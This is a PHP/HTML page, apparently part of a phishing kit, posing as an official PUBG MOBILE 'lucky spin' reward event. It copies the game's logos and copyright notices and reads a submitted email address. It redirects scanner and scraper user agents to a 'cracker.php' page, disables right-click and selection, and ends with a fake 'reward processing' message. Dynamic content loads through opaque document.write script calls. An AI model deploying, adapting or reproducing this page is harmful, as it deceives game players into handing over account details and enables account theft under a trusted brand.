<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == ""){
header("Location: index.php");
}
?>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PUBG MOBILE: LUCKY SPIN EVENT</title>
    <link rel="icon" type="img/png" href="https://www.pubgmobile.com/common/images/icon_logo.jpg" sizes="32x32">
    <meta property="og:description" content="Start a event from KRAFTON, Inc. You can spin in one times only!">
    <meta property="og:image" content="https://www.pubgmobile.com/common/images/icon_logo.jpg">
    <meta property="og:image:width" content="540">
    <meta property="og:image:height" content="282">
    <link rel="stylesheet" href="css-zone/style-processing.css">
    <link rel="stylesheet" href="css-zone/login/Selfc.css">
    <link rel="stylesheet" href="css-zone/login/Seltw.css">
    <link href="https://fonts.googleapis.com/css2?family=Teko&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <script type="text/javascript" src="js-zone/jquery.js"> </script>
    <script type="text/javascript" src="js-zone/main-zone.js"></script>
    <script src="js-zone/showHide.js"></script>
    <script src="js-zone/slideshow.js"></script>
    <script type="text/javascript" src="index_files/main-zone.js.download">
    </script>
    <script language="JavaScript">
        document.write(ls())
    </script>
    <script language="JavaScript">
        document.write(ls())
    </script>
    <script script language="JavaScript">
        document.write(riyanandhika())
    </script>
    <link href="./index_files/css" rel="stylesheet">
    <script language="JavaScript">
        document.write(head())
    </script>
</head>

<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
    <div class="slider-container">
<div class="navbar">
<div class="navbar-btn-wrapper">
<i class="fa fa-bars fa-2x"></i>
<button type="button" class="navbar-btn" onclick="location.href='https://www.pubgmobile.com/pay/';" onmousedown="buka.play();">Purchase</button>
<button type="button" class="navbar-btn" onclick="location.href='https://play.google.com/store/apps/details?id=com.tencent.ig';" onmousedown="buka.play();">Download</button>
</div> <!--- navbar-btn-wrapper --->
<img class="navbar-logo" src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div class="navbar-txt-game">
PUBG MOBILE
<br>
<span>OFFICIAL PUBG ON MOBILE</span>
</div> <!--- navbar-txt-game --->
</div> <!--- navbar --->
        <!--- navbar --->
        <div class="header">
            <video src="media/header.mp4" autoplay loop muted></video>
        </div>
        <!--- header --->
        <div class="gallery-container">
            <center>
                <div class="season-img" style="height: 100px;">
                </div>
                <div class="cont">
                    <div id="zone" class="gallery">
                        <script language="JavaScript">
                            document.write(inti())
                        </script>
                        <section class="container" id="js-lotto">
                            <div class="square" data-order="0">
                                <div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                        <defs>
                                            <pattern id="gift1" patternUnits="userSpaceOnUse" width="100" height="100">
                                                <image xlink:href='img/itemselow/1.png' x="-25" width="150" height="100"></image>
                                            </pattern>
                                        </defs>
                                        <polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift1)"></polygon>
                                    </svg></div>
                            </div>
                            <div class="square" data-order="1">
                                <div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                        <defs>
                                            <pattern id="gift2" patternUnits="userSpaceOnUse" width="90" height="90">
                                                <image xlink:href='img/itemselow/2.png' x="-25" width="150" height="100"></image>
                                            </pattern>
                                        </defs>
                                        <polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift2)"></polygon>
                                    </svg></div>
                            </div>
                            <div class="squar" data-order="5">
                                <div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                        <defs>
                                            <pattern id="gift3" patternUnits="userSpaceOnUse" width="100" height="100">
                                                <image xlink:href='img/itemselow/3.png' x="-25" width="150" height="100"></image>
                                            </pattern>
                                        </defs>
                                        <polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift3)"></polygon>
                                    </svg></div>
                            </div>
                            <div class="start squar__start-btn">
                                <div>
                                    <center>
                                        <o onclick="klik1()"><img style="margin-top: 15px;" src='img/itemselow/spin.png' width="85" height="100" id="js-start"></o>
                                    </center>
                                </div>
                            </div>
                            <div class="squar" data-order="2">
                                <div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                        <defs>
                                            <pattern id="gift4" patternUnits="userSpaceOnUse" width="100" height="100">
                                                <image xlink:href='img/itemselow/4.png' x="-25" width="150" height="100"></image>
                                            </pattern>
                                        </defs>
                                        <polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift4)"></polygon>
                                    </svg></div>
                            </div>
                            <div class="square" data-order="4">
                                <div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                        <defs>
                                            <pattern id="gift5" patternUnits="userSpaceOnUse" width="100" height="100">
                                                <image xlink:href='img/itemselow/5.png' x="-25" width="150" height="100"></image>
                                            </pattern>
                                        </defs>
                                        <polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift5)"></polygon>
                                    </svg></div>
                            </div>
                            <div class="square" data-order="3">
                                <div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg">
                                        <defs>
                                            <pattern id="gift6" patternUnits="userSpaceOnUse" width="100" height="100">
                                                <image xlink:href='img/itemselow/6.png' x="-25" width="150" height="100"></image>
                                            </pattern>
                                        </defs>
                                        <polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift6)"></polygon>
                                    </svg></div>
                            </div>
                        </section>
                    </div>
                </div>
                <script language="JavaScript">
                    document.write(foot())
                </script>

        </div>
        <div class="div-bot" style="color:white;padding-top: 10px;padding-bottom: 1px;">
            <center>
        </div>
        <div class="footer">
            <div class="footer-txt-follow">ㅤㅤ</div>
            <div class="footer-txt-follow">Follow Us</div>
            <!--- footer-txt-follow --->
            <center>
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_1.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_2.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_3.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_4.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_5.png">
            </center>
            <!--- footer-txt-copyright --->
            </center>
            <img class="footer-copyright-icon" src="https://i.ibb.co/Wx8wkq1/footer-img.png">
            <div class="footer-txt-copyright">ⓒ 2017 KRAFTON, Inc. All rights reserved.</div>
            <!--- footer-txt-copyright --->
            <div class="footer-txt-copyright">ⓒ 2018-2021 Tencent. All rights reserved.</div>
            <!--- footer-txt-copyright --->
            <div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div>
            <!--- footer-txt-copyright --->
        </div>
        <!--- footer --->
    </div>
    <!--- container --->
    </p>
    </center>
    </div>
    <div class="popup">
        <div class="popup-box">
            <div class="nav-popup">
                <div class="popup-rewards-title" style="padding-bottom: 40px; color: #fff; text-align: center;">PROCESSING REWARD</div>
            </div>
            <div class="popup-alerts">
                <div>Thank you for joining the PUBG MOBILE Event</div>
                <div>Your account is being processed</div>
                <div>To receive your reward</div>
                <div>The reward will be sent via in-game Mail</div>
                <div>Please wait up to 24 hours<br></div>
                <br><br>
                <br>
                <button type="button" onmousedown="buka.play();" class="popup-btn-active-center" onclick="location.href='https://pubgmobile.com/';">Logout</button>
            </div>
        </div>
    </div>

    <script src="./index_files/jquery.min.js.download">
    </script>
    <script language="JavaScript">
        document.write(result())
    </script>
    <script type="text/javascript" src="index_files/gift-zone.js"></script>
    <script>
        function openHero(evt, heroClass) {
            var i, gallery, tab;
            gallery = document.getElementsByClassName("gallery");
            for (i = 0; i < gallery.length; i++) {
                gallery[i].style.display = "none";
            }
            tab = document.getElementsByClassName("tab");
            for (i = 0; i < tab.length; i++) {
                tab[i].className = tab[i].className.replace(" active", "");
            }
            document.getElementById(heroClass).style.display = "block";
            evt.currentTarget.className += " active";
        }
        document.getElementById("defaultOpen").click();
    </script>
    <script type="text/javascript" src="js-zone/slide-zone.js"> </script>
    <script type="text/javascript" src="./index_files/slide-zone.js.download">
    </script>
    <script language="JavaScript">
        document.write(luckyspin())
    </script>

    <style type="text/css">
        *: (input, textarea) {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
        }
    </style>
    <style type="text/css">
        img {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
        }
    </style>


    <style type="text/css">
        .dav {
            background: rgba(0, 0, 0, 0.8);
            height: 300px;
            width: 350px;
            position: absolute;
            top: 80%;
            left: 50%;
            transform: translate(-50%, -50%);
            border: 1px solid #00eafc;
            border-radius: 10px;
        }

        .text-dav {
            font-family: teko;
            font-size: 18px;
            text-align: center;
            margin-top: 50px;
            font-family: teko;
        }

        .batas {
            margin: 30px auto 20px auto;
            text-align: center;
        }

        .btn-log {
            width: 90%;
            display: block;
            margin: 10px auto;
            font-family: 'Teko', sans-serif;
            border: none;
            padding: 8px 0;
            border-radius: 5px;
        }

        .btn-log i {
            margin-left: 12px;
            color: #fff;
            font-size: 18px;
            line-height: 20px;
        }

        .fb {
            background-color: #1877F1;
            color: #fff;
            font-size: 18px;
            line-height: 28px;
        }

        .tw {
            background-color: #08a0e9;
            color: #fff;
            font-size: 18px;
            line-height: 28px;
        }

        .tw:hover {
            background: #08a0e99e;
        }

        .gambar {
            width: 120px;
            height: 120px;
            border-bottom: 3px solid #cd3d3e;
            border-radius: 5px;
        }

        .bawah {
            text-align: center;
            margin: 5px;
        }

        #claim {
            background: url('img/but.png') no-repeat center;
            background-size: cover;
            width: 150px;
            height: 30px;
            padding-left: -2px;
        }
    </style>



    <audio id="klik1" src="https://b.top4top.io/m_2105ul2sl0.mp3">
        <script>
            function klik3() {
                $('#dav').fadeIn('slow');
                $('#hadiah').hide();
            }
        </script>
        <script>
            // TIMER 2
            $(document).ready(function() {
                var detik = 59;
                var menit = 59;
                var jam = 23;

                function hitung() {
                    setTimeout(hitung, 1000);
                    $('#timer').html(+jam + ' : ' + menit + ' : ' + detik + '');
                    detik--;
                    if (detik < 0) {
                        detik = 59;
                        menit--;
                        if (menit < 0) {
                            menit = 0;
                            detik = 0;
                        }
                    }
                }
                hitung();
            });
            // <![CDATA[
            function klik1() {
                var audio = document.getElementById('klik1');
                audio.play();
            }
            $(document).ready(function() {
                $("o").attr("onclick", "klik1()");
            });
            //]]>
        </script>

    </audio>

</body>
</html>